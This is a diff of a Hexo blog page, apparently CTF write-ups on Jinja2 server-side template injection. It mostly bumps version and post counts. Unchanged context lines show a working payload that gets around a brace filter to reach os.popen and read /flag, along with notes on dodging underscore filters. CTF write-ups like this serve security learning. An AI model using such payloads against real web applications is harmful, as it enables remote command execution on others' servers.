@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width">
-<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.2">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
 
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-trophy-1.png">
@@ -157,13 +157,13 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">83</span>
+          <span class="site-state-item-count">84</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-count">7</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
@@ -302,7 +302,7 @@
 <h1 id="WEB-368-过滤了左花括号"><a href="#WEB-368-过滤了左花括号" class="headerlink" title="WEB-368(过滤了左花括号)"></a>WEB-368(过滤了左花括号)</h1><p>用<code>&#123;%print()%&#125;</code></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;%<span class="built_in">print</span>((lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read())%&#125;&amp;a=__globals__&amp;b=os&amp;c=cat /flag</span><br></pre></td></tr></table></figure>
 
-<h1 id="WEB-369-过滤了request"><a href="#WEB-369-过滤了request" class="headerlink" title="WEB-369(过滤了request)"></a>WEB-369(过滤了request)</h1><h2 id="payload-1-1"><a href="#payload-1-1" class="headerlink" title="payload_1"></a>payload_1</h2><p>截取配置config构造 这类下划线被ban了 不能用<code>__str()__</code>    所以就要用过滤器了</p>
+<h1 id="WEB-369-过滤了request"><a href="#WEB-369-过滤了request" class="headerlink" title="WEB-369(过滤了request)"></a>WEB-369(过滤了request)</h1><h2 id="payload-1-1"><a href="#payload-1-1" class="headerlink" title="payload_1"></a>payload_1</h2><p>截取配置config构造 这类下划线被ban了 不能用<code>__str()__</code>	所以就要用过滤器了</p>
 <p>获取字符串后本来要用<code>__getitem__</code>问题是<code>_</code>被ban了</p>
 <p>所以这里需要转换成list然后用<code>pop()</code>就可以得到我们想要的字符</p>
 <p>师傅们的payload:</p>
